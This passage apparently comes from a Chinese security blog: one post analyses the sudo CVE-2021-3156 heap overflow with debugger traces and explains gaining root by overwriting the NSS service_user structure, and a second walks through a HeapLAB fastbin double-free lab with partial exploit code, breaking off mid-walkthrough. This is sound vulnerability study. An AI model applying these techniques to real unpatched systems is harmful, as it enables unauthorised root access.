0x7ff7adad8264 &lt;sudoers_policy_main+3508&gt; mov r15, qword ptr [rbx] 0x7ff7adad8267 &lt;sudoers_policy_main+3511&gt; test r15, r15 0x7ff7adad826a &lt;sudoers_policy_main+3514&gt; je sudoers_policy_main+3528 &lt;sudoers_policy_main+3528&gt; ↓ 0x7ff7adad8278 &lt;sudoers_policy_main+3528&gt; mov byte ptr [rax - 1], 0────────────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]─────────────────────────────────────────────────────────────────────────────────────────────In file: /home/x/Documents/cve-2021-3156/sudo-SUDO_1_8_31/plugins/sudoers/sudoers.c 863 */ 864 for (to = user_args, av = NewArgv + 1; (from = *av); av++) { 865 while (*from) { 866 if (from[0] == '\\\\' &amp;&amp; !isspace((unsigned char)from[1])) 867 from++; ► 868 *to++ = *from++; 869 } 870 *to++ = ' '; 871 } 872 *--to = '\\0'; 873 } else {────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────00:0000│ rsp 0x7ffef02936f0 ◂— 0x7ffe0000000001:0008│ 0x7ffef02936f8 ◂— 0x002:0010│ 0x7ffef0293700 ◂— 0x7ffe0002000203:0018│ 0x7ffef0293708 ◂— 0xaeb2bc8904:0020│ 0x7ffef0293710 ◂— 0x300000000005:0028│ 0x7ffef0293718 —▸ 0x7ffef02937b0 —▸ 0x7ffef0293830 ◂— 0x006:0030│ 0x7ffef0293720 —▸ 0x7ffef0293730 ◂— 0xffffffffffffffff07:0038│ 0x7ffef0293728 ◂— 0x0──────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 0x7ff7adad8211 sudoers_policy_main+3425 f 1 0x7ff7adad8211 sudoers_policy_main+3425 f 2 0x7ff7adad10fa sudoers_policy_check+154 f 3 0x55ded1571c46 main+1030 f 4 0x55ded1571c46 main+1030 f 5 0x7ff7ae9300b3 __libc_start_main+243──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; bt#0 set_cmnd () at ./sudoers.c:868#1 sudoers_policy_main (argc=argc@entry=3, argv=argv@entry=0x7ffef0293aa0, pwflag=pwflag@entry=0, env_add=env_add@entry=0x0, verbose=verbose@entry=false, closure=closure@entry=0x7ffef02937b0) at ./sudoers.c:306#2 0x00007ff7adad10fa in sudoers_policy_check (argc=3, argv=0x7ffef0293aa0, env_add=0x0, command_infop=0x7ffef0293828, argv_out=0x7ffef0293830, user_env_out=0x7ffef0293838) at ./policy.c:872#3 0x000055ded1571c46 in policy_check (plugin=0x55ded15927a0 &lt;policy_plugin&gt;, user_env_out=0x7ffef0293838, argv_out=0x7ffef0293830, command_info=0x7ffef0293828, env_add=0x0, argv=0x7ffef0293aa0, argc=3) at ./sudo.c:1138#4 main (argc=argc@entry=4, argv=argv@entry=0x7ffef0293a98, envp=0x7ffef0293ac0) at ./sudo.c:253#5 0x00007ff7ae9300b3 in __libc_start_main (main=0x55ded1571840 &lt;main&gt;, argc=4, argv=0x7ffef0293a98, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7ffef0293a88) at ../csu/libc-start.c:308#6 0x000055ded15735ae in _start () at ./sudo.c:770pwndbg&gt; 可以看出来崩溃点在sudoers.c文件中的868行，看起来在做内存复制操作，调用栈也能看得清，分析一下源码。 sudo加上 -s和-i选项会分别设置MODE_SHELL，MODE_SHELL&amp;&amp;MODE_LOGIN_SHELL。在main 函数中调用了parse_args函数，其中会重写argv：注意一点，如果启用了MODE_SHELL，会对参数添加反斜杠‘\\’进行转义。之后将command都将被复制到堆上。 123456789101112131415161718if (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) { char **av, *cmnd = NULL; int ac = 1; if (argc != 0) { /* shell -c &quot;command&quot; */ char *src, *dst; size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) + strlen(argv[argc - 1]) + 1; //command部分长度 cmnd = dst = reallocarray(NULL, cmnd_size, 2); //这是为了防止所有字符都需要转义 for (av = argv; *av != NULL; av++) { for (src = *av; *src != '\\0'; src++) { /* quote potential meta characters */ if (!isalnum((unsigned char)*src) &amp;&amp; *src != '_' &amp;&amp; *src != '-' &amp;&amp; *src != '$') *dst++ = '\\\\'; //对反斜杠进行转义 *dst++ = *src; } ... } 之后会进入sudoers_policy_check，在sudoers_policy_main中调用了set_cmnd()，在set_cmnd中会根据参数的大小分配空间user_args， 随后判断是否开启了MODE_SHELL即“-s”参数， 开启了则将命令行参数拷贝到user_args中，并将command中的元字符反转义。但是这里的拷贝流程有个问题，如果“\\”后面紧跟的是“\\0”，那么临时变量from则会+2跳过结束符指向下一个字符串，从而造成越界写。 12345678910... for (to = user_args, av = NewArgv + 1; (from = *av); av++) { while (*from) {//&lt;---------Notice Here if (from[0] == '\\\\' &amp;&amp; !isspace((unsigned char)from[1]))//注意这里判断的是一个反斜杠 from++; //进入这个逻辑时，此时from++后已经时结束符了 *to++ = *from++;//在拷贝完之后又将from++，此时则指向了后面的数据 } *to++ = ' '; }... 漏洞是这么个情况，但是为什么sudo中的洞需要用sudoedit来触发呢？这里涉及到sudo中的一个校验： 当启用MODE_SHELL flag时， parse_args函数会对其添加“\\”进行转义，而set_cmnd中触发堆溢出前会判断是否启用了MODE_SHELL 以及MODE_RUN、MODE_EDIT、MODE_CHECK这三个中的一个。也就是说MODE_SHELL是必须的，并且需要存在单个‘\\’才能触发漏洞，但是启用了MODE_SHELL &amp; MODE_RUN就会将\\转义成为\\”，所以使用sudo就无法触发漏洞。但是sudoedit是个特殊的存在： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/* * Default flags allowed when running a command. */#define DEFAULT_VALID_FLAGS (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)/* * Command line argument parsing. * Sets nargc and nargv which corresponds to the argc/argv we'll use * for the command to be run (if we are running one). */intparse_args(int argc, char **argv, int *nargc, char ***nargv, struct sudo_settings **settingsp, char ***env_addp){ struct environment extra_env; int mode = 0; /* what mode is sudo to be run in? */ int flags = 0; /* mode flags */ int valid_flags = DEFAULT_VALID_FLAGS; ... /* First, check to see if we were invoked as &quot;sudoedit&quot;. */ proglen = strlen(progname); if (proglen &gt; 4 &amp;&amp; strcmp(progname + proglen - 4, &quot;edit&quot;) == 0) { progname = &quot;sudoedit&quot;; mode = MODE_EDIT; sudo_settings[ARG_SUDOEDIT].value = &quot;true&quot;; } for (;;) { if ((ch = getopt_long(argc, argv, short_opts, long_opts, NULL)) != -1) { //解析命令行参数 switch (ch) { …… case 'e': mode = MODE_EDIT; valid_flags = MODE_NONINTERACTIVE; break; …… case 's': SET(flags, MODE_SHELL); break; …… } …… } ……}……if ((flags &amp; valid_flags) != flags) //同时设置 -s -e会在此处退出 usage(1);} 可以看到如果调用程序为sudoedit的时候，会为其添加MODE_EDIT flag，这时再使用-s 即可满足条件且不会被转义。 0x02 利用在写具体利用前我们先整理下： 现在我们有了一个堆溢出， 能够越界写并且写的内容是完全可控的。同时存储我们数据的user_args空间也是可控的，大小可控内容可控。 同时也有限制， 溢出只能触发一次。我们也没有办法绕过aslr， 所以像常规的修改链表指针、ret2libc 之类的技巧这里就完全用不上了。 讲道理这里我也不知道该怎么去利用了，但是Qualys团队牛逼啊，他们通过爆破来找寻找漏洞利用方式： 在gdb中执行sudo， 溢出user_args 缓冲区并随即选择下面的参数： 向sudo传递LC环境变量，以及他们的长度（使用“C.UTF-8”并追加一个随机字符”@modifier”） 我们溢出的”user_args”缓冲区的大小 是否通过身份认证代码（-A ， -n， -u） 还真让他们给找到了，找到三种利用方式，这里我们只看比较好用的一种：覆写service_user结构。 12345678910111213typedef struct service_user{ /* And the link to the next entry. */ struct service_user *next; /* Action according to result. */ lookup_actions actions[5]; /* Link to the underlying library object. */ service_library *library; /* Collection of known functions. */ void *known; /* Name of the service (`files', `dns', `nis', ...). */ char name[0];} service_user; Name Service Switch(NSS)是unix操作系统中的一项机制，主要用于为名称解析机制提供来源，也就是选择对应的so文件提供服务。配置文件在/etc/nsswitch.conf中： 12345678910111213✗ cat /etc/nsswitch.conf # /etc/nsswitch.conf## Example configuration of GNU Name Service Switch functionality.# If you have the `glibc-doc-reference' and `info' packages installed, try:# `info libc &quot;Name Service Switch&quot;' for information about this file.passwd: files systemdgroup: files systemdshadow: filesgshadow: files... 针对每种“数据库”， 都有对应的libnss_XXXXX.so.1与之对应，在程序中通过nss_load_library 加载对应的库，之后在调用对应函数时会先调用 nss_lookup_function进行查找。 根据nss_load_library 函数得知： 当对应service_user中的library为空时，会通过_libc_dlopen 调用“libnss_”+”service_user→name”+”.so”。所以我们通过覆写service_user结构中的library和name字段即可使程序加载我们自己设置的恶意libc进而执行我们的代码。 这里再说一下提权 123✗ ls -alth /usr/local/bin/sudo*lrwxrwxrwx 1 root root 4 Sep 25 01:59 /usr/local/bin/sudoedit -&gt; sudo-rwsr-xr-x 1 root root 586K Sep 25 01:59 /usr/local/bin/sudo 可以看到sudoedit 就是sudo的一个链接，sudo 拥有一个特殊的权限标记s， 表明它的所有者为root。所以当我们通过它来执行setuid、setgid的时候也就是相当于通过root身份来完成的。所以在我们伪造的so中只需要执行setuid(0), setgid(0)便可以提权，最后再执行一个shell。 这里拿测试比较稳定的exp来调试，应对上面的理论。 123456789101112➜ CVE-2021-3156 git:(main) ✗ zsh➜ CVE-2021-3156 git:(main) ✗ whoamix➜ CVE-2021-3156 git:(main) ✗ ./exploit # iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(x)# whoamiroot...echo &quot;catch exec\\n set follow-exec-mode new\\n r\\n b policy_check\\n c\\n b sudoers.c:865 \\n b nss_load_librarty\\n&quot; &gt; dbg.txtsudo gdb exploit -x dbg.txt 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127pwndbg&gt; search -s files [heap][heap] 0x55934bcebae0 0x78650073656c6966 /* 'files' */[heap] 0x55934bcef380 0x530073656c6966 /* 'files' */[heap] 0x55934bcefd30 0x73656c6966 /* 'files' */[heap] 0x55934bcefd90 0x73656c6966 /* 'files' */[heap] 0x55934bcefdf0 0x73656c6966 /* 'files' */[heap] 0x55934bcefef0 0x73656c6966 /* 'files' */[heap] 0x55934bceffa0 0x73656c6966 /* 'files' */[heap] 0x55934bcf0050 0x2010073656c6966 /* 'files' */[heap] 0x55934bcf00f0 0x10073656c6966 /* 'files' */[heap] 0x55934bcf0190 0x73656c6966 /* 'files' */[heap] 0x55934bcf028d 'files.so.2'[heap] 0x55934bcf02bd 'files.so.2'[heap] 0x55934bcf11a7 'files.so.2'[heap] 0x55934bcfbcc8 0x6e692073656c6966 ('files in')[heap] 0x55934bcfbd8c 0x6e692073656c6966 ('files in')[heap] 0x55934bcfbe38 0x6e6f2073656c6966 ('files on')[heap] 0x55934bcfcd28 0x6e692073656c6966 ('files in')[heap] 0x55934bcfcdec 0x6e692073656c6966 ('files in')[heap] 0x55934bcfce98 0x6e6f2073656c6966 ('files on')pwndbg&gt; hexdump 0x55934bcef380+0000 0x55934bcef380 66 69 6c 65 73 00 53 00 31 01 00 00 00 00 00 00 │file│s.S.│1...│....│+0010 0x55934bcef390 b0 f0 ce 4b 93 55 00 00 01 00 00 00 00 00 00 00 │...K│.U..│....│....│+0020 0x55934bcef3a0 00 00 00 00 00 00 00 00 a0 f2 ce 4b 93 55 00 00 │....│....│...K│.U..│+0030 0x55934bcef3b0 e0 e2 ce 4b 93 55 00 00 50 eb ce 4b 93 55 00 00 │...K│.U..│P..K│.U..│pwndbg&gt; hexdump 0x55934bcef350+0000 0x55934bcef350 a0 fc ce 4b 93 55 00 00 00 00 00 00 00 00 00 00 │...K│.U..│....│....│+0010 0x55934bcef360 00 00 00 00 01 00 00 00 01 00 00 00 6e 2f 4c 43 │....│....│....│n/LC│+0020 0x55934bcef370 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │....│....│....│....│+0030 0x55934bcef380 66 69 6c 65 73 00 53 00 31 01 00 00 00 00 00 00 │file│s.S.│1...│....│─────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────────────In file: /home/x/Documents/cve-2021-sudo/sudo-SUDO_1_8_31/plugins/sudoers/sudoers.c 860 * When running a command via a shell, the sudo front-end 861 * escapes potential meta chars. We unescape non-spaces 862 * for sudoers matching and logging purposes. 863 */ 864 for (to = user_args, av = NewArgv + 1; (from = *av); av++) { ► 865 while (*from) { 866 if (from[0] == '\\\\' &amp;&amp; !isspace((unsigned char)from[1])) 867 from++; 868 *to++ = *from++; 869 } 870 *to++ = ' ';─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────00:0000│ rsp 0x7ffeffee5480 ◂— 0x7ffe0000000001:0008│ 0x7ffeffee5488 ◂— 0x002:0010│ 0x7ffeffee5490 ◂— 0x7ffe0002000203:0018│ 0x7ffeffee5498 ◂— 0x14100c8904:0020│ 0x7ffeffee54a0 ◂— 0x300000000005:0028│ 0x7ffeffee54a8 —▸ 0x7ffeffee5540 —▸ 0x7ffeffee55c0 ◂— 0x006:0030│ 0x7ffeffee54b0 —▸ 0x7ffeffee54c0 ◂— 0xffffffffffffffff07:0038│ 0x7ffeffee54b8 ◂— 0x0───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────── ► f 0 0x7fda1309b1f0 sudoers_policy_main+3392 f 1 0x7fda1309b1f0 sudoers_policy_main+3392 f 2 0x7fda130940fa sudoers_policy_check+154 f 3 0x55934adf9c46 main+1030 f 4 0x55934adf9c46 main+1030 f 5 0x7fda13f050b3 __libc_start_main+243────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; p to$1 = 0x55934bceedb0 &quot;&quot;pwndbg&gt; x/6gx to-0x100x55934bceeda0: 0x0000000000000000 0x00000000000000f10x55934bceedb0: 0x0000000000000000 0x00000000000000000x55934bceedc0: 0x6170676e616c2d65 0x4141406e652f6b63pwndbg&gt; cContinuing.Thread 2.1 &quot;sudoedit&quot; hit Breakpoint 4, nss_load_library (ni=ni@entry=0x55934bcef350) at nsswitch.c:329329 nsswitch.c: No such file or directory.LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────*RAX 0x7fda140969d7 ◂— 'initgroups_dyn'*RBX 0x55934bcef350 ◂— 'XXXXXXXXXXXXXXXX'*RCX 0x55934bceb010 ◂— 0x200000001*RDX 0x1*RDI 0x55934bcef350 ◂— 'XXXXXXXXXXXXXXXX'*RSI 0x55934bcfb670 ◂— 0x0*R8 0x55934bd03b90 —▸ 0x7fda140969d7 ◂— 'initgroups_dyn'*R9 0x7ffeffee4bb0 ◂— 0xff00*R10 0xffffffff*R11 0x0*R12 0x55934bcf6de0 —▸ 0x55934bd03b90 —▸ 0x7fda140969d7 ◂— 'initgroups_dyn'*R13 0x7ffeffee4d18 —▸ 0x7fda140969d7 ◂— 'initgroups_dyn'*R14 0x55934bcef378 —▸ 0x55934bcf6de0 —▸ 0x55934bd03b90 —▸ 0x7fda140969d7 ◂— 'initgroups_dyn'*R15 0x55934bd03b90 —▸ 0x7fda140969d7 ◂— 'initgroups_dyn'*RBP 0x7ffeffee4d60 ◂— 0x0*RSP 0x7ffeffee4d08 —▸ 0x7fda14024ed9 (__nss_lookup_function+233) ◂— test eax, eax*RIP 0x7fda140244c0 (nss_load_library) ◂— push rbp─────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────── ► 0x7fda140244c0 &lt;nss_load_library&gt; push rbp 0x7fda140244c1 &lt;nss_load_library+1&gt; mov rbp, rsp 0x7fda140244c4 &lt;nss_load_library+4&gt; push r15 0x7fda140244c6 &lt;nss_load_library+6&gt; push r14 0x7fda140244c8 &lt;nss_load_library+8&gt; push r13 0x7fda140244ca &lt;nss_load_library+10&gt; push r12 0x7fda140244cc &lt;nss_load_library+12&gt; mov r12, rdi 0x7fda140244cf &lt;nss_load_library+15&gt; push rbx 0x7fda140244d0 &lt;nss_load_library+16&gt; sub rsp, 0x28 0x7fda140244d4 &lt;nss_load_library+20&gt; mov rbx, qword ptr [rdi + 0x20] 0x7fda140244d8 &lt;nss_load_library+24&gt; mov rax, qword ptr fs:[0x28]─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────00:0000│ rsp 0x7ffeffee4d08 —▸ 0x7fda14024ed9 (__nss_lookup_function+233) ◂— test eax, eax01:0008│ 0x7ffeffee4d10 —▸ 0x7fda140c9be0 (main_arena+96) —▸ 0x55934bd03ba0 ◂— 0x002:0010│ r13 0x7ffeffee4d18 —▸ 0x7fda140969d7 ◂— 'initgroups_dyn'03:0018│ 0x7ffeffee4d20 ◂— 0x4000404:0020│ 0x7ffeffee4d28 ◂— 0x665ff3421361260005:0028│ 0x7ffeffee4d30 ◂— 0x4001006:0030│ 0x7ffeffee4d38 ◂— 0x107:0038│ 0x7ffeffee4d40 —▸ 0x7ffeffee4de8 ◂— 0x10001───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────── ► f 0 0x7fda140244c0 nss_load_library f 1 0x7fda14024ed9 __nss_lookup_function+233 f 2 0x7fda13fc013f internal_getgrouplist+175 f 3 0x7fda13fc03ed getgrouplist+109 f 4 0x7fda140fc316 sudo_getgrouplist2_v1+198 f 5 0x7fda130ad593 sudo_make_gidlist_item+451 f 6 0x7fda130ac33e sudo_get_gidlist+286 f 7 0x7fda130a609d runas_getgroups+93────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; hexdump $rdi+0000 0x55934bcef350 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 │XXXX│XXXX│XXXX│XXXX│+0010 0x55934bcef360 00 00 00 00 00 00 00 00 00 58 58 58 58 58 58 58 │....│....│.XXX│XXXX│+0020 0x55934bcef370 00 00 00 00 00 00 00 00 e0 6d cf 4b 93 55 00 00 │....│....│.m.K│.U..│+0030 0x55934bcef380 78 2f 78 00 5a 00 53 00 31 01 00 00 00 00 00 00 │x/x.│Z.S.│1...│....│# 对比上面的地址，已经将files覆盖成了&quot;x/x&quot; 要点（坑）通过设置user_args 溢出覆盖service_user 结构的原理我们已经比较清楚了，而且这里是作者通过爆破的方式找到的利用点。 但是这里有个问题，如何将user_args分配在service_user结构的附近。因为如果两者相距过远，在溢出过程中可能会覆盖一些关键结构，造成程序退出。所以这里涉及到将特定内存块分配到特定的位置上，也就是所谓的“堆风水”。这里的布局方式也是不知道，只能归功于爆破和fuzz &gt;##&lt; 0x03 小结 漏洞本身是个逻辑问题造成的堆溢出 通过使用sudoedit绕过程序中的限制触发漏洞 利用sudo函数中开始地方调用的setlocale相关函数控制user_args堆的大小以及布局堆的排布 通过堆风水配合溢出，覆盖service_user 结构的library=NULL和name字段，进而使得nss_load_library 加载可控的库文件 至于如何找到nss_load_library 这个会被调用的点？←——— 爆破+fuzz 123456789101112131415161718//根据这个调用栈，手动找也不是不行，可能得花超多的时间..... ► f 0 0x7f89905114c0 nss_load_library f 1 0x7f8990511ed9 __nss_lookup_function+233 f 2 0x7f89904ad13f internal_getgrouplist+175 f 3 0x7f89904ad3ed getgrouplist+109 f 4 0x7f89905e9316 sudo_getgrouplist2_v1+198 f 5 0x7f898f59a593 sudo_make_gidlist_item+451 f 6 0x7f898f59933e sudo_get_gidlist+286 f 7 0x7f898f59309d runas_getgroups+93───────────────────────────────────────────────► f 0 0x7f898f593040 runas_getgroups f 1 0x7f898f584872 set_perms+1650 f 2 0x7f898f584872 set_perms+1650 f 3 0x7f898f57ed5a sudoers_lookup+106 f 4 0x7f898f587b41 sudoers_policy_main+1681 f 5 0x7f898f5810fa sudoers_policy_check+154 f 6 0x55fda0420c46 main+1030 f 7 0x55fda0420c46 main+1030 除了利用部分，其实我对这个漏洞的发现也比较好奇。虽然sudo是有源码可以fuzz的，但是基于分析过程中所说的几项限制，似乎从fuzz的角度是很难发现的。最后在网上搜到当事团队的视频，讲他们其实是通过代码审计发现的： ￼ 另外，发现利用方式那里也很有意思。通过爆破的方式，利用程序一开始便加载的定位相关函数，制造crash来寻找利用方式。学到了学到了。。。 0x04 参考链接 Heap-based buffer overflow in Sudo (CVE-2021-3156) exploit from lockedbyte Linux系统内部的名称解析与安全认证 CVE-2021-3156sudo堆溢出分析","link":"/2021/09/28/cve-2021-3156-%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0%EF%BC%88%E6%9C%89%E5%9D%91%E6%B2%A1%E5%A1%AB%EF%BC%89/"},{"title":"glibc 利用之Fastbin Dup","text":"针对fastbin，利用double free在两次malloc 时获得同一个块chunk，然后在第一次拿到chunk后修改堆的结构，将假的chunk链接到当前块，之后可以通过malloc分配到假的chunk，从而实现任意地址读写，这就是所谓的Fastbin Dup。 这里拿HeapLab中的fastbin_dup 当例子，逐步分析。运行程序可以看到主窗口，先输入用户名，之后可以malloc、free以及查看target。 1234567891011x@ubuntu  fastbin_dup  ./fastbin_dup ===============| HeapLAB | Fastbin Dup===============puts() @ 0x7f5f61acaaf0Enter your username: FastbinDup1) malloc 0/72) free3) target4) quit&gt; 既然利用需要double free，那就先试试double free （实际做题时，可以盲测或者直接用ida 看free后有没有置空）， 直接malloc 一次free 两次，结果报错了：double free or corruption (fasttop) Program received signal SIGABRT, Aborted. 看下原因： 12345678910111213141516171819202122232425262728─────────────────────────────────[ BACKTRACE ]────────────────────────────────── ► f 0 7ffff7a5204a raise+202 f 1 7ffff7a530f5 abort+357 f 2 7ffff7a93f07 __libc_message+599 f 3 7ffff7a9b2aa f 4 7ffff7a9ccb4 _int_free+948 f 5 400a22 main+603 f 6 7ffff7a3e037 __libc_start_main+231────────────────────────────────────────────────────────────────────────────────pwndbg&gt; f 4#4 0x00007ffff7a9ccb4 in _int_free (av=0x7ffff7dd0b60 &lt;main_arena&gt;, p=0x603000, have_lock=0) at malloc.c:42664266 malloc_printerr (&quot;double free or corruption (fasttop)&quot;);pwndbg&gt; context codeLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────[ SOURCE (CODE) ]────────────────────────────────In file: /home/x/.glibc/glibc_2.30_no-tcache/malloc/malloc.c 4261 if (SINGLE_THREAD_P) 4262 { 4263 /* Check that the top of the bin is not the record we are going to 4264 add (i.e., double free). */ 4265 if (__builtin_expect (old == p, 0)) ► 4266 malloc_printerr (&quot;double free or corruption (fasttop)&quot;); 4267 p-&gt;fd = old; 4268 *fb = p; 4269 } 4270 else 4271 do──────────────────────────────────────────────────────────────────────────────── 根据代码的注释可以看到，malloc 中的_int_free 函数会检查我们释放后要添加进fastbin中的chunk是否已经是fastbin中的第一个bin，是则提示double free，否则就通过检查。ok，既然如此我们就不用第一个bin试试看： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263io.sendafter(&quot;username: &quot;, &quot;FastbinDup&quot;)io.recvuntil(&quot;&gt; &quot;)chunk_A = malloc(0x68, &quot;A&quot;*0x68)chunk_B = malloc(0x68, &quot;B&quot;*0x68)input(&quot;after malloc&quot;)free(chunk_A)free(chunk_B)input(&quot;after free normal&quot;)---pwndbg&gt; vis0x11a2000 0x0000000000000000 0x0000000000000071 ........q.......0x11a2010 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2020 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2030 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2040 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2050 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2060 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2070 0x4141414141414141 0x0000000000000071 AAAAAAAAq.......0x11a2080 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a2090 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20a0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20b0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20c0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20d0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20e0 0x4242424242424242 0x0000000000020f21 BBBBBBBB!....... &lt;-- Top chunkpwndbg&gt; fastbins fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0...pwndbg&gt; vis0x11a2000 0x0000000000000000 0x0000000000000071 ........q....... &lt;-- fastbins[0x70][1]0x11a2010 0x0000000000000000 0x4141414141414141 ........AAAAAAAA0x11a2020 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2030 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2040 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2050 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2060 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2070 0x4141414141414141 0x0000000000000071 AAAAAAAAq....... &lt;-- fastbins[0x70][0]0x11a2080 0x00000000011a2000 0x4242424242424242 . ......BBBBBBBB0x11a2090 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20a0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20b0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20c0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20d0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20e0 0x4242424242424242 0x0000000000020f21 BBBBBBBB!....... &lt;-- Top chunkpwndbg&gt; fastbins fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x11a2070 —▸ 0x11a2000 ◂— 0x00x80: 0x0pwndbg&gt; 正常的malloc 和free后，可以看到两个chunk都被放进了大小为0x70的fastbin中，且后free的在前面，也就是后入先出。那我们触发double free就free chunk_A 好了，试试看： 12345678910111213141516171819202122232425262728free(chunk_A)input(&quot;after double free&quot;)---pwndbg&gt; vis0x11a2000 0x0000000000000000 0x0000000000000071 ........q....... &lt;-- fastbins[0x70][0], fastbins[0x70][0]0x11a2010 0x00000000011a2070 0x4141414141414141 p ......AAAAAAAA0x11a2020 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2030 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2040 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2050 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2060 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x11a2070 0x4141414141414141 0x0000000000000071 AAAAAAAAq....... &lt;-- fastbins[0x70][1]0x11a2080 0x00000000011a2000 0x4242424242424242 . ......BBBBBBBB0x11a2090 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20a0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20b0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20c0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20d0 0x4242424242424242 0x4242424242424242 BBBBBBBBBBBBBBBB0x11a20e0 0x4242424242424242 0x0000000000020f21 BBBBBBBB!....... &lt;-- Top chunkpwndbg&gt; fastbins fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x11a2000 —▸ 0x11a2070 ◂— 0x11a20000x80: 0x0 ok，看起来第一步已经实现了，成功布局chunk_A → chunk_B ← chunk_A ，接下来应该是将fake 地址链接到当前的fastbin中，先试试将user 的地址拉过来： 1234567891011121314151617181920212223242526272829303132333435dup=malloc(0x68, p64(elf.sym.user))input(&quot;malloc for user addr&quot;)---pwndbg&gt; ptype usertype = struct user { char username[16]; char target[16];}pwndbg&gt; p user$1 = { username = &quot;FastbinDup\\000\\000\\000\\000\\000&quot;, target = &quot;XXXXXXX\\000\\000\\000\\000\\000\\000\\000\\000&quot;}pwndbg&gt; fastbins fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x1e81000 —▸ 0x1e81070 ◂— 0x1e810000x80: 0x0pwndbg&gt; cContinuing.^Cpwndbg&gt; fastbins fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x1e81070 —▸ 0x1e81000 —▸ 0x602010 (user) ◂— 0x58585858585858 /* 'XXXXXXX' */0x80: 0x0pwndbg&gt; 看起来比较顺利，我们通过malloc后得到chunk_A， 之后将chunk_A中的fd指针指向user的地址，从而将user链入当前的bin中。后面如果能够成功的在user地址中写入内容，就算实现任意地址写了呗。 123456input(&quot;malloc for user addr&quot;)malloc(0x68,&quot;C&quot;*0x68)malloc(0x68,&quot;D&quot;*0x68)malloc(0x68,&quot;arbitrary write&quot;)---malloc(): memory corruption 